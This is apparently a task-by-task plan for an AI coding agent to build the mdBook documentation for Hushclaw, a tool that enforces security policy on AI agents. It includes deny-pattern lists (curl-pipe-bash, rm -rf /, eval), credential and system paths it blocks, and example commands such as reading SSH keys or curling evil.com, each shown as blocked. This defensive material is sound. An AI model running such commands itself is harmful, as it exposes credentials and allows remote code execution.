# Hushclaw Documentation Site Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Create a complete mdBook documentation site with getting started guides, concept docs, guard references, OpenClaw integration guide, and working examples.

**Architecture:** mdBook-based static site with organized sections for concepts, guides, references, and recipes. Examples are standalone projects that compile/run independently.

**Tech Stack:** mdBook, Rust, TypeScript, YAML policies, GitHub Actions

---

## Task 1: mdBook Scaffold

**Files:**
- Create: `docs/book.toml`
- Create: `docs/src/SUMMARY.md`
- Create: `docs/theme/custom.css`

**Step 1: Create book.toml**

```toml
[book]
title = "Hushclaw Documentation"
authors = ["Hushclaw Contributors"]
description = "Multi-model security enforcement for AI agents"
language = "en"
src = "src"

[build]
build-dir = "book"

[output.html]
default-theme = "navy"
preferred-dark-theme = "navy"
git-repository-url = "https://github.com/hushclaw/hushclaw"
edit-url-template = "https://github.com/hushclaw/hushclaw/edit/main/docs/{path}"
additional-css = ["theme/custom.css"]

[output.html.fold]
enable = true
level = 1
```

**Step 2: Create SUMMARY.md**

```markdown
# Summary

[Introduction](README.md)

# Getting Started

- [Installation](getting-started/installation.md)
- [Quick Start](getting-started/quick-start.md)
- [Your First Policy](getting-started/first-policy.md)

# Concepts

- [Architecture](concepts/architecture.md)
- [Guards](concepts/guards.md)
- [Policies](concepts/policies.md)
- [Decisions](concepts/decisions.md)

# Guides

- [OpenClaw Integration](guides/openclaw-integration.md)
- [Custom Guards](guides/custom-guards.md)
- [Policy Inheritance](guides/policy-inheritance.md)
- [Audit Logging](guides/audit-logging.md)

# Reference

- [Policy Schema](reference/policy-schema.md)
- [Guards](reference/guards/README.md)
  - [ForbiddenPathGuard](reference/guards/forbidden-path.md)
  - [EgressAllowlistGuard](reference/guards/egress.md)
  - [SecretLeakGuard](reference/guards/secret-leak.md)
  - [PatchIntegrityGuard](reference/guards/patch-integrity.md)
  - [McpToolGuard](reference/guards/mcp-tool.md)
- [Rulesets](reference/rulesets/README.md)
  - [Default](reference/rulesets/default.md)
  - [Strict](reference/rulesets/strict.md)
  - [AI Agent](reference/rulesets/ai-agent.md)
- [API](reference/api/README.md)
  - [Rust](reference/api/rust.md)
  - [TypeScript](reference/api/typescript.md)
  - [CLI](reference/api/cli.md)

# Recipes

- [Claude Code Integration](recipes/claude-code.md)
- [GitHub Actions](recipes/github-actions.md)
- [Self-Hosted Runners](recipes/self-hosted.md)
```

**Step 3: Create custom.css**

```css
/* Hushclaw Documentation Theme */

:root {
  --hush-primary: #6366f1;
  --hush-primary-dark: #4f46e5;
  --hush-accent: #22c55e;
  --hush-warning: #f59e0b;
  --hush-danger: #ef4444;
}

/* Code blocks */
pre code {
  font-family: 'JetBrains Mono', 'Fira Code', monospace;
  font-size: 0.9em;
}

/* Tables */
table {
  width: 100%;
  border-collapse: collapse;
  margin: 1em 0;
}

th {
  background: var(--bg);
  font-weight: 600;
  text-align: left;
  padding: 0.75em;
  border-bottom: 2px solid var(--table-border-color);
}

td {
  padding: 0.75em;
  border-bottom: 1px solid var(--table-border-color);
}

/* Admonitions */
.warning {
  background: rgba(245, 158, 11, 0.1);
  border-left: 4px solid var(--hush-warning);
  padding: 1em;
  margin: 1em 0;
}

.danger {
  background: rgba(239, 68, 68, 0.1);
  border-left: 4px solid var(--hush-danger);
  padding: 1em;
  margin: 1em 0;
}

.tip {
  background: rgba(34, 197, 94, 0.1);
  border-left: 4px solid var(--hush-accent);
  padding: 1em;
  margin: 1em 0;
}

/* Feature boxes */
.feature-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 1em;
  margin: 1.5em 0;
}

.feature-box {
  padding: 1em;
  border: 1px solid var(--table-border-color);
  border-radius: 8px;
}
```

**Step 4: Create directory structure**

Run: `mkdir -p docs/src/{getting-started,concepts,guides,reference/{guards,rulesets,api},recipes} docs/theme`

**Step 5: Verify mdBook builds**

Run: `cd /Users/connor/Medica/hushclaw-ws5-docs && mdbook build docs`
Expected: Build succeeds (with warnings about missing files)

**Step 6: Commit**

```bash
git add docs/
git commit -m "feat(docs): add mdBook scaffold with navigation structure"
```

---

## Task 2: Landing Page (README.md)

**Files:**
- Create: `docs/src/README.md`

**Step 1: Write landing page**

```markdown
# Hushclaw

**Multi-model security enforcement for AI agents**

Hushclaw is an open-source security suite that protects AI agents from:

- **Credential theft** - Blocks access to SSH keys, cloud credentials, API keys
- **Data exfiltration** - Controls network egress with domain allowlists
- **Code injection** - Detects dangerous patterns like `curl|bash`
- **Secret leakage** - Prevents API keys from appearing in outputs

## Quick Start

```bash
# Install the CLI
cargo install hush-cli

# Create a policy
cat > policy.yaml << 'EOF'
version: "hushclaw-v1.0"
extends: hushclaw:ai-agent
EOF

# Run with protection
hush run --policy policy.yaml -- your-agent
```

## For OpenClaw Users

```bash
npm install @hushclaw/openclaw
openclaw plugins enable @hushclaw/openclaw
```

[Get Started →](./getting-started/installation.md)

## Key Features

| Feature | Description |
|---------|-------------|
| **5 Built-in Guards** | ForbiddenPath, Egress, SecretLeak, PatchIntegrity, McpTool |
| **YAML Policies** | Simple, readable policy definitions |
| **Hot Reload** | Update policies without restarting |
| **3 Modes** | Deterministic (block), Advisory (warn), Audit (log) |
| **Crypto Primitives** | Ed25519 signing, Merkle trees for audit trails |
| **Multi-Language** | Rust core, TypeScript SDK, Python SDK (coming) |

## Architecture

```
┌────────────────────────────────────────────────────────┐
│                    Your Agent                          │
│  (Claude Code, OpenClaw, Custom)                       │
└─────────────────────────┬──────────────────────────────┘
                          │
┌─────────────────────────▼──────────────────────────────┐
│                    Hushclaw                            │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────┐ │
│  │ Guards   │  │ Policy   │  │ Audit    │  │ Crypto │ │
│  │ (5 types)│  │ Engine   │  │ Logging  │  │ (sign) │ │
│  └──────────┘  └──────────┘  └──────────┘  └────────┘ │
└────────────────────────────────────────────────────────┘
```

## What's Protected by Default?

With the `ai-agent-minimal` policy:

| Category | Protected Items |
|----------|-----------------|
| Credentials | `~/.ssh/*`, `~/.aws/*`, `~/.gnupg/*` |
| Secrets | `.env` files, `*.pem`, `*.key` |
| Network | Only allowlisted domains |
| System | `/etc/shadow`, `/etc/passwd` |

## Community

- [GitHub](https://github.com/hushclaw/hushclaw)
- [Discord](https://discord.gg/hushclaw)
- [Contributing](https://github.com/hushclaw/hushclaw/blob/main/CONTRIBUTING.md)

## License

MIT
```

**Step 2: Verify build**

Run: `cd /Users/connor/Medica/hushclaw-ws5-docs && mdbook build docs`
Expected: Build succeeds

**Step 3: Commit**

```bash
git add docs/src/README.md
git commit -m "feat(docs): add landing page with quick start"
```

---

## Task 3: Getting Started - Installation

**Files:**
- Create: `docs/src/getting-started/installation.md`

**Step 1: Write installation guide**

```markdown
# Installation

Choose your preferred installation method.

## Rust CLI (hush-cli)

The CLI is the primary way to use hushclaw.

### From crates.io (Recommended)

```bash
cargo install hush-cli
```

### From Source

```bash
git clone https://github.com/hushclaw/hushclaw
cd hushclaw
cargo install --path crates/hush-cli
```

### Verify Installation

```bash
hush --version
# hush-cli 0.1.0
```

## TypeScript SDK

For Node.js and browser environments:

```bash
npm install @hushclaw/sdk
# or
yarn add @hushclaw/sdk
# or
pnpm add @hushclaw/sdk
```

## OpenClaw Plugin

If you're using OpenClaw:

```bash
npm install @hushclaw/openclaw
openclaw plugins enable @hushclaw/openclaw
```

## Python SDK (Coming Soon)

```bash
pip install hush
```

## Docker

Run the daemon in a container:

```bash
docker run -d \
  --name hushd \
  -v ~/.hush:/root/.hush \
  -p 9090:9090 \
  ghcr.io/hushclaw/hushd:latest
```

## System Requirements

| Component | Requirement |
|-----------|-------------|
| Rust CLI | Rust 1.75+ |
| TypeScript SDK | Node.js 18+ |
| Python SDK | Python 3.10+ |
| Docker | Docker 20.10+ |

## Next Steps

- [Quick Start](./quick-start.md) - Get running in 5 minutes
- [Your First Policy](./first-policy.md) - Write a custom policy
```

**Step 2: Commit**

```bash
git add docs/src/getting-started/installation.md
git commit -m "feat(docs): add installation guide"
```

---

## Task 4: Getting Started - Quick Start

**Files:**
- Create: `docs/src/getting-started/quick-start.md`

**Step 1: Write quick start guide**

```markdown
# Quick Start

Get hushclaw protecting your agent in 5 minutes.

## Step 1: Install

```bash
cargo install hush-cli
```

## Step 2: Create a Policy

Create a file named `policy.yaml`:

```yaml
# policy.yaml
version: "hushclaw-v1.0"

# Use a built-in base policy
extends: hushclaw:ai-agent-minimal

# Customize as needed
filesystem:
  allowed_write_roots:
    - "/workspace"
    - "/tmp"
```

## Step 3: Enable Protection

### Option A: Wrap Your Command

```bash
hush run --policy policy.yaml -- python my_agent.py
```

### Option B: OpenClaw Config

```json
{
  "plugins": {
    "entries": {
      "@hushclaw/openclaw": {
        "enabled": true,
        "config": {
          "policy": "./policy.yaml"
        }
      }
    }
  }
}
```

## Step 4: Verify It Works

Try an operation that should be blocked:

```bash
# This should fail
hush run --policy policy.yaml -- cat ~/.ssh/id_rsa
```

Expected output:

```
⛔ BLOCKED by ForbiddenPathGuard
   Path: ~/.ssh/id_rsa
   Reason: Path matches forbidden pattern: ~/.ssh/*
   Severity: CRITICAL
```

## What's Protected?

With the default `ai-agent-minimal` policy:

| Protected | Examples |
|-----------|----------|
| Credentials | `~/.ssh/*`, `~/.aws/*`, `~/.gnupg/*` |
| Secrets | `.env` files, `*.pem`, `*.key` |
| Network | Only allowlisted domains |
| System files | `/etc/shadow`, `/etc/passwd` |

## Try These Examples

```bash
# Allowed: Read workspace files
hush run --policy policy.yaml -- cat ./README.md
# ✅ ALLOWED

# Blocked: Read SSH keys
hush run --policy policy.yaml -- cat ~/.ssh/id_rsa
# ⛔ BLOCKED

# Allowed: Fetch from GitHub
hush run --policy policy.yaml -- curl https://api.github.com/zen
# ✅ ALLOWED

# Blocked: Fetch from unknown domain
hush run --policy policy.yaml -- curl https://evil.com/data
# ⛔ BLOCKED
```

## Modes

| Mode | Behavior | Use Case |
|------|----------|----------|
| `deterministic` | Block violations | Production (default) |
| `advisory` | Warn but allow | Testing policies |
| `audit` | Log only | Gradual rollout |

```bash
# Advisory mode (warn only)
hush run --policy policy.yaml --mode advisory -- your-command
```

## Next Steps

- [Understanding Guards](../concepts/guards.md) - Learn about the 5 built-in guards
- [Writing Custom Policies](./first-policy.md) - Create policies for your needs
- [OpenClaw Integration](../guides/openclaw-integration.md) - Deep integration guide
```

**Step 2: Commit**

```bash
git add docs/src/getting-started/quick-start.md
git commit -m "feat(docs): add quick start guide"
```

---

## Task 5: Getting Started - First Policy

**Files:**
- Create: `docs/src/getting-started/first-policy.md`

**Step 1: Write first policy guide**

```markdown
# Your First Policy

Learn to write custom security policies for your agents.

## Policy Basics

A hushclaw policy is a YAML file that defines security rules:

```yaml
version: "hushclaw-v1.0"

egress:
  mode: allowlist
  allowed_domains:
    - "api.github.com"

filesystem:
  forbidden_paths:
    - "~/.ssh"
    - "~/.aws"

on_violation: cancel
```

## Extending Built-in Policies

Start from a base policy and customize:

```yaml
version: "hushclaw-v1.0"
extends: hushclaw:ai-agent-minimal

# Add your domains
egress:
  allowed_domains:
    - "api.stripe.com"
    - "sentry.io"

# Add project-specific protections
filesystem:
  forbidden_paths:
    - "./secrets"
    - "./.env.production"
```

## Policy Sections

### Egress (Network)

Control outbound network connections:

```yaml
egress:
  mode: allowlist  # allowlist, denylist, or open

  allowed_domains:
    - "api.anthropic.com"
    - "api.openai.com"
    - "*.github.com"

  denied_domains:
    - "*.onion"
    - "localhost"
    - "127.*"
```

### Filesystem

Control file access:

```yaml
filesystem:
  # Directories where writes are allowed
  allowed_write_roots:
    - "/workspace"
    - "/tmp"

  # Paths that must never be accessed
  forbidden_paths:
    - "~/.ssh"
    - "~/.aws"
    - ".env"
    - "*.pem"
```

### Execution

Control command execution:

```yaml
execution:
  # Patterns to block
  denied_patterns:
    - "rm -rf /"
    - "curl.*|.*bash"
    - "sudo su"
```

### Tools

Control MCP/agent tools:

```yaml
tools:
  allowed: []  # Empty = all allowed
  denied:
    - "shell_exec_raw"
```

### Limits

Resource limits:

```yaml
limits:
  max_execution_seconds: 300
  max_memory_mb: 4096
  max_output_bytes: 10485760
```

## Violation Actions

What happens when a rule is violated:

```yaml
on_violation: cancel  # Options: cancel, warn, isolate, escalate
```

| Action | Behavior |
|--------|----------|
| `cancel` | Block the operation immediately |
| `warn` | Log warning but allow |
| `isolate` | Cut network, continue read-only |
| `escalate` | Require human approval |

## Validate Your Policy

```bash
hush policy lint policy.yaml
```

Output:

```
✓ Syntax valid
✓ Schema valid
✓ No conflicts detected

Suggestions:
  - Consider adding 'pypi.org' for Python package access
```

## Test Against Events

```bash
# Create a test event
cat > event.json << 'EOF'
{
  "event_type": "file_read",
  "data": {
    "path": "~/.ssh/id_rsa"
  }
}
EOF

# Test it
hush policy test event.json --policy policy.yaml
```

Output:

```
Event: file_read ~/.ssh/id_rsa
Result: DENIED
Guard: ForbiddenPathGuard
Reason: Path matches forbidden pattern: ~/.ssh/*
```

## Complete Example

```yaml
# my-project-policy.yaml
version: "hushclaw-v1.0"
extends: hushclaw:ai-agent

# Project uses Stripe and Sentry
egress:
  allowed_domains:
    - "api.stripe.com"
    - "sentry.io"

# Project-specific secrets
filesystem:
  forbidden_paths:
    - "./secrets"
    - "./.env.production"
    - "./credentials.json"
  allowed_write_roots:
    - "./src"
    - "./tests"
    - "/tmp"

# Tighter execution limits
limits:
  max_execution_seconds: 120

on_violation: cancel
```

## Next Steps

- [Architecture](../concepts/architecture.md) - Understand how hushclaw works
- [Guards Reference](../reference/guards/README.md) - All guard details
- [Policy Schema](../reference/policy-schema.md) - Full schema reference
```

**Step 2: Commit**

```bash
git add docs/src/getting-started/first-policy.md
git commit -m "feat(docs): add first policy tutorial"
```

---

## Task 6: Concepts - Architecture

**Files:**
- Create: `docs/src/concepts/architecture.md`

**Step 1: Write architecture doc**

```markdown
# Architecture

Hushclaw is designed as a modular, composable security enforcement layer.

## Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                         Your Agent                               │
│  (Claude Code, OpenClaw, Custom Agent)                          │
└────────────────────────────────┬────────────────────────────────┘
                                 │ Events
┌────────────────────────────────▼────────────────────────────────┐
│                         Hushclaw                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │                    Policy Engine                         │    │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐    │    │
│  │  │ Load    │→ │ Parse   │→ │ Compile │→ │ Cache   │    │    │
│  │  └─────────┘  └─────────┘  └─────────┘  └─────────┘    │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                 │                                │
│  ┌─────────────────────────────▼───────────────────────────┐    │
│  │                    Guard Registry                        │    │
│  │  ┌───────────┐ ┌───────────┐ ┌───────────┐ ┌─────────┐ │    │
│  │  │ Forbidden │ │ Egress    │ │ Secret    │ │ Patch   │ │    │
│  │  │ Path      │ │ Allowlist │ │ Leak      │ │ Integrity│ │    │
│  │  └───────────┘ └───────────┘ └───────────┘ └─────────┘ │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                 │                                │
│  ┌─────────────────────────────▼───────────────────────────┐    │
│  │                    Decision Engine                       │    │
│  │  Event → Guards → Aggregate → Decision (Allow/Warn/Deny) │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                 │                                │
│  ┌─────────────────────────────▼───────────────────────────┐    │
│  │                    Audit Ledger                          │    │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐                  │    │
│  │  │ Events  │→ │ Merkle  │→ │ Sign    │→ Receipts       │    │
│  │  └─────────┘  └─────────┘  └─────────┘                  │    │
│  └─────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────┘
```

## Core Components

### Policy Engine

Loads, parses, and compiles YAML policies into efficient evaluation structures.

```rust
let policy = Policy::from_yaml_file("policy.yaml")?;
let engine = HushEngineBuilder::new()
    .with_policy(policy)
    .build()?;
```

Key features:
- **Inheritance** - Extend built-in policies with `extends:`
- **Hot reload** - Update policies without restart
- **Validation** - Catch errors before deployment

### Guard Registry

Guards are modular security checks. Each guard handles specific event types:

| Guard | Events | Purpose |
|-------|--------|---------|
| ForbiddenPathGuard | FileRead, FileWrite | Block sensitive paths |
| EgressAllowlistGuard | NetworkEgress | Domain allowlist |
| SecretLeakGuard | PatchApply | Detect secrets in output |
| PatchIntegrityGuard | PatchApply | Block dangerous code |
| McpToolGuard | ToolCall | Tool allow/deny lists |

### Decision Engine

Aggregates guard results into a final decision:

```
Allow + Allow + Allow = Allow
Allow + Warn + Allow = Warn
Allow + Deny + Allow = Deny (short-circuit)
```

### Audit Ledger

Records all events and decisions for accountability:

- **Events** - What was attempted
- **Decisions** - What was decided
- **Merkle Tree** - Tamper-evident log
- **Signatures** - Cryptographic proof

## Event Flow

```
1. Agent requests action (file read, network call, etc.)
         ↓
2. Action converted to Event
         ↓
3. Event sent to Guard Registry
         ↓
4. Each applicable Guard evaluates
         ↓
5. Results aggregated into Decision
         ↓
6. Event + Decision logged to Ledger
         ↓
7. Decision returned to Agent
         ↓
8. Allow → proceed, Deny → block, Warn → proceed + log
```

## Crate Structure

```
hush-core       # Crypto primitives (Ed25519, SHA-256, Merkle)
    ↓
hush-proxy      # Network interception utilities
    ↓
hushclaw        # Runtime enforcement (guards, policy, IRM)
    ↓
hush-cli        # Command-line interface
    ↓
hushd           # Long-running daemon (optional)
```

## Integration Points

### Direct Library

```rust
use hushclaw::{HushEngine, Event};

let engine = HushEngine::new(policy)?;
let decision = engine.evaluate(&event).await;
```

### CLI Wrapper

```bash
hush run --policy policy.yaml -- your-command
```

### OpenClaw Plugin

```typescript
// Automatically intercepts tool calls
await openclaw.registerPlugin("@hushclaw/openclaw");
```

### Daemon Mode

```bash
hushd --config /etc/hush/config.yaml
```

## Performance

| Operation | Target Latency |
|-----------|----------------|
| Cached evaluation | < 1ms |
| Uncached evaluation | < 5ms |
| Async (with I/O) | < 20ms |
| Policy load | < 100ms |
| Hot reload | < 50ms |

## Next Steps

- [Guards](./guards.md) - Deep dive into guard types
- [Policies](./policies.md) - Policy system details
- [Decisions](./decisions.md) - Decision types and modes
```

**Step 2: Commit**

```bash
git add docs/src/concepts/architecture.md
git commit -m "feat(docs): add architecture overview"
```

---

## Task 7: Concepts - Guards

**Files:**
- Create: `docs/src/concepts/guards.md`

**Step 1: Write guards concept doc**

```markdown
# Guards

Guards are modular security checks that evaluate events against policies.

## What is a Guard?

A guard is a focused security check that:
1. Receives an event (file read, network call, etc.)
2. Evaluates it against policy rules
3. Returns a result (Allow, Warn, or Deny)

```rust
#[async_trait]
pub trait Guard: Send + Sync {
    fn name(&self) -> &str;
    async fn check(&self, event: &Event, policy: &Policy) -> GuardResult;
}
```

## Built-in Guards

Hushclaw includes 5 battle-tested guards:

### ForbiddenPathGuard

Blocks access to sensitive filesystem paths.

```yaml
filesystem:
  forbidden_paths:
    - "~/.ssh/*"
    - "~/.aws/*"
    - ".env"
```

**Protects against:** Credential theft, secret exposure

[Full Reference →](../reference/guards/forbidden-path.md)

### EgressAllowlistGuard

Controls network connections via domain allowlist.

```yaml
egress:
  mode: allowlist
  allowed_domains:
    - "api.github.com"
    - "*.anthropic.com"
```

**Protects against:** Data exfiltration, C2 connections

[Full Reference →](../reference/guards/egress.md)

### SecretLeakGuard

Detects secrets in outputs and patches.

```yaml
# Enabled by default, no config needed
# Detects: AWS keys, GitHub tokens, private keys, etc.
```

**Protects against:** Accidental secret exposure

[Full Reference →](../reference/guards/secret-leak.md)

### PatchIntegrityGuard

Blocks dangerous code patterns in patches.

```yaml
execution:
  denied_patterns:
    - "curl.*|.*bash"
    - "eval\\("
```

**Protects against:** Code injection, RCE

[Full Reference →](../reference/guards/patch-integrity.md)

### McpToolGuard

Controls which MCP tools can be invoked.

```yaml
tools:
  allowed: []  # Empty = all allowed
  denied:
    - "shell_exec_raw"
```

**Protects against:** Unauthorized tool usage

[Full Reference →](../reference/guards/mcp-tool.md)

## Guard Results

Each guard returns one of three results:

| Result | Meaning | Behavior |
|--------|---------|----------|
| `Allow` | Event is safe | Proceed |
| `Warn` | Suspicious but allowed | Proceed + log warning |
| `Deny` | Dangerous, block it | Stop + log denial |

```rust
pub enum GuardResult {
    Allow,
    Warn { message: String },
    Deny { reason: String, severity: Severity },
}
```

## Guard Evaluation

Guards are evaluated in registration order. Evaluation stops on first Deny:

```
Event: FileRead("~/.ssh/id_rsa")

ForbiddenPathGuard: Deny (path forbidden)
  → Short-circuit, return Deny

Final: DENIED
```

For warnings, all guards run:

```
Event: FileRead("./suspicious.txt")

ForbiddenPathGuard: Allow
EgressAllowlistGuard: Skip (not network event)
SecretLeakGuard: Warn (filename suspicious)
PatchIntegrityGuard: Skip (not patch event)

Final: WARN
```

## Custom Guards

You can implement custom guards:

```rust
use hushclaw::{Guard, GuardResult, Event, Policy};

pub struct RateLimitGuard {
    requests: AtomicUsize,
    limit: usize,
}

#[async_trait]
impl Guard for RateLimitGuard {
    fn name(&self) -> &str {
        "RateLimitGuard"
    }

    async fn check(&self, event: &Event, _policy: &Policy) -> GuardResult {
        let count = self.requests.fetch_add(1, Ordering::Relaxed);
        if count > self.limit {
            GuardResult::Deny {
                reason: "Rate limit exceeded".into(),
                severity: Severity::Medium,
            }
        } else {
            GuardResult::Allow
        }
    }
}
```

Register it:

```rust
let mut registry = GuardRegistry::with_defaults();
registry.register(Arc::new(RateLimitGuard::new(100)));
```

[Custom Guards Guide →](../guides/custom-guards.md)

## Guard Configuration

Enable/disable guards per policy:

```yaml
guards:
  forbidden_path: true
  egress_allowlist: true
  secret_leak: true
  patch_integrity: false  # Disabled
  mcp_tool: false         # Disabled
```

## Next Steps

- [Policies](./policies.md) - How policies configure guards
- [Decisions](./decisions.md) - How guard results become decisions
- [Guard Reference](../reference/guards/README.md) - Detailed guard docs
```

**Step 2: Commit**

```bash
git add docs/src/concepts/guards.md
git commit -m "feat(docs): add guards concept documentation"
```

---

## Task 8: Concepts - Policies

**Files:**
- Create: `docs/src/concepts/policies.md`

**Step 1: Write policies concept doc**

```markdown
# Policies

Policies are YAML files that configure security rules for hushclaw.

## Policy Structure

Every policy has these sections:

```yaml
version: "hushclaw-v1.0"     # Schema version
extends: hushclaw:default     # Optional base policy

egress:                        # Network rules
  mode: allowlist
  allowed_domains: [...]

filesystem:                    # File access rules
  forbidden_paths: [...]
  allowed_write_roots: [...]

execution:                     # Command rules
  denied_patterns: [...]

tools:                         # Tool access rules
  allowed: [...]
  denied: [...]

limits:                        # Resource limits
  max_execution_seconds: 300

on_violation: cancel           # What to do on violation
```

## Policy Inheritance

Use `extends` to build on base policies:

```yaml
# Your policy
version: "hushclaw-v1.0"
extends: hushclaw:ai-agent

# Only specify overrides
egress:
  allowed_domains:
    - "api.mycompany.com"
```

Built-in base policies:

| Name | Description |
|------|-------------|
| `hushclaw:minimal` | Bare minimum protection |
| `hushclaw:default` | Balanced security |
| `hushclaw:strict` | Maximum security |
| `hushclaw:ai-agent` | Optimized for AI agents |
| `hushclaw:cicd` | For CI/CD pipelines |

## Policy Merging

When extending, values are merged:

```yaml
# Base policy
egress:
  allowed_domains:
    - "api.github.com"

# Your policy
extends: base
egress:
  allowed_domains:
    - "api.stripe.com"

# Effective policy
egress:
  allowed_domains:
    - "api.github.com"    # From base
    - "api.stripe.com"    # From yours
```

For forbidden paths, lists are combined:

```yaml
# Base
filesystem:
  forbidden_paths:
    - "~/.ssh"

# Yours
filesystem:
  forbidden_paths:
    - "./secrets"

# Effective
filesystem:
  forbidden_paths:
    - "~/.ssh"
    - "./secrets"
```

## Environment Variables

Use variables in policies:

```yaml
filesystem:
  allowed_write_roots:
    - "${WORKSPACE}"       # Expands to current directory
    - "${TMPDIR}"          # System temp directory
    - "${HOME}/.cache"     # User cache directory
```

## Policy Modes

Three enforcement modes:

| Mode | Behavior | Use Case |
|------|----------|----------|
| `deterministic` | Block violations | Production |
| `advisory` | Warn but allow | Testing |
| `audit` | Log only | Rollout |

Set via CLI:

```bash
hush run --mode advisory --policy policy.yaml -- command
```

Or environment:

```bash
HUSHCLAW_MODE=advisory hush run --policy policy.yaml -- command
```

## Policy Loading

Policies are loaded from (in order):

1. CLI flag: `--policy ./custom.yaml`
2. Environment: `HUSHCLAW_POLICY=/path/to/policy.yaml`
3. Project: `.hush/policy.yaml`
4. User: `~/.config/hush/policy.yaml`
5. System: `/etc/hush/policy.yaml`
6. Built-in: `hushclaw:default`

## Hot Reload

Policies can be reloaded without restart:

```bash
# Signal daemon to reload
hush policy reload

# Or via API
curl -X POST http://localhost:9090/policy/reload
```

## Validation

Always validate before deployment:

```bash
hush policy lint policy.yaml
```

Checks:
- YAML syntax
- Schema compliance
- Path format validity
- Domain format validity
- Logical conflicts

## Best Practices

1. **Start with a base policy** - Use `extends:` instead of from scratch
2. **Use environment variables** - `${WORKSPACE}` over hardcoded paths
3. **Test in advisory mode** - Before enforcing
4. **Version control policies** - Track changes
5. **Validate in CI** - Catch errors early

## Next Steps

- [Decisions](./decisions.md) - How violations are handled
- [Policy Schema](../reference/policy-schema.md) - Full schema reference
- [Policy Inheritance](../guides/policy-inheritance.md) - Advanced inheritance
```

**Step 2: Commit**

```bash
git add docs/src/concepts/policies.md
git commit -m "feat(docs): add policies concept documentation"
```

---

## Task 9: Concepts - Decisions

**Files:**
- Create: `docs/src/concepts/decisions.md`

**Step 1: Write decisions concept doc**

```markdown
# Decisions

Decisions are the outcomes of policy evaluation.

## Decision Types

Every evaluation produces one of three decisions:

### Allow

The event is safe and can proceed.

```rust
Decision::Allow
```

No logging by default (unless audit mode is enabled).

### Warn

The event is suspicious but allowed to proceed.

```rust
Decision::Warn {
    message: "Filename looks suspicious",
    guard: Some("SecretLeakGuard"),
}
```

The warning is logged and the operation continues.

### Deny

The event is blocked.

```rust
Decision::Deny {
    reason: "Path matches forbidden pattern: ~/.ssh/*",
    guard: "ForbiddenPathGuard",
    severity: Severity::Critical,
}
```

The operation is stopped and an error is returned.

## Severity Levels

Denials include a severity level:

| Severity | Meaning | Examples |
|----------|---------|----------|
| `Low` | Unusual but not dangerous | Rate limit exceeded |
| `Medium` | Potentially problematic | Suspicious filename |
| `High` | Likely dangerous | Unknown domain access |
| `Critical` | Definitely dangerous | SSH key access |

```yaml
# Decisions with Critical severity are always logged
# Lower severities depend on log level
```

## Decision Aggregation

Multiple guards produce multiple results. Aggregation rules:

```
All Allow → Allow
Any Warn + No Deny → Warn (combined messages)
Any Deny → Deny (first denial wins)
```

Example:

```
Event: file_write("./output.txt")

Guard 1 (ForbiddenPath): Allow
Guard 2 (SecretLeak): Warn "Contains API key pattern"
Guard 3 (PatchIntegrity): Allow

Final Decision: Warn
Message: "Contains API key pattern"
```

## Mode Effects

The evaluation mode affects how decisions are applied:

### Deterministic Mode (Default)

```
Allow → Proceed
Warn → Proceed + Log warning
Deny → Block + Log error
```

### Advisory Mode

```
Allow → Proceed
Warn → Proceed + Log warning
Deny → Proceed + Log warning (converted from Deny)
```

### Audit Mode

```
Allow → Proceed + Log
Warn → Proceed + Log
Deny → Proceed + Log (never blocks)
```

## Decision Logging

All decisions can be logged to the audit ledger:

```json
{
  "event_id": "evt_abc123",
  "timestamp": "2026-01-31T14:23:45Z",
  "event_type": "file_read",
  "target": "~/.ssh/id_rsa",
  "decision": "deny",
  "guard": "ForbiddenPathGuard",
  "reason": "Path matches forbidden pattern",
  "severity": "critical"
}
```

## Signed Receipts

For high-assurance environments, decisions can be signed:

```json
{
  "run_id": "run_xyz789",
  "events": [...],
  "merkle_root": "0x7f3a...",
  "signature": "ed25519:abc...",
  "public_key": "ed25519:xyz..."
}
```

Verify with:

```bash
hush verify receipt.json
```

## Programmatic Access

Check decisions in code:

```rust
let decision = engine.evaluate(&event).await;

match decision {
    Decision::Allow => {
        // Proceed with operation
    }
    Decision::Warn { message, .. } => {
        log::warn!("{}", message);
        // Proceed with operation
    }
    Decision::Deny { reason, severity, .. } => {
        log::error!("Blocked: {} (severity: {:?})", reason, severity);
        // Return error to caller
    }
}
```

Helper methods:

```rust
decision.is_allowed()  // true for Allow and Warn
decision.is_denied()   // true for Deny only
decision.severity()    // Some(Severity) for Deny, None otherwise
```

## Next Steps

- [Audit Logging](../guides/audit-logging.md) - Configure logging
- [Guards Reference](../reference/guards/README.md) - What each guard returns
- [CLI Reference](../reference/api/cli.md) - View decisions via CLI
```

**Step 2: Commit**

```bash
git add docs/src/concepts/decisions.md
git commit -m "feat(docs): add decisions concept documentation"
```

---

## Task 10: Guard Reference - Overview and ForbiddenPath

**Files:**
- Create: `docs/src/reference/guards/README.md`
- Create: `docs/src/reference/guards/forbidden-path.md`

**Step 1: Write guards overview**

```markdown
# Guards Reference

Complete reference for all built-in guards.

## Overview

| Guard | Purpose | Default |
|-------|---------|---------|
| [ForbiddenPathGuard](./forbidden-path.md) | Block sensitive paths | Enabled |
| [EgressAllowlistGuard](./egress.md) | Control network access | Enabled |
| [SecretLeakGuard](./secret-leak.md) | Detect secrets in output | Enabled |
| [PatchIntegrityGuard](./patch-integrity.md) | Block dangerous code | Enabled |
| [McpToolGuard](./mcp-tool.md) | Control tool access | Enabled |

## Enable/Disable Guards

```yaml
guards:
  forbidden_path: true
  egress_allowlist: true
  secret_leak: true
  patch_integrity: true
  mcp_tool: true
```

## Event Types

Each guard handles specific events:

| Guard | FileRead | FileWrite | NetworkEgress | ToolCall | PatchApply |
|-------|----------|-----------|---------------|----------|------------|
| ForbiddenPath | ✓ | ✓ | | | |
| Egress | | | ✓ | | |
| SecretLeak | | | | | ✓ |
| PatchIntegrity | | | | | ✓ |
| McpTool | | | | ✓ | |
```

**Step 2: Write ForbiddenPathGuard reference**

```markdown
# ForbiddenPathGuard

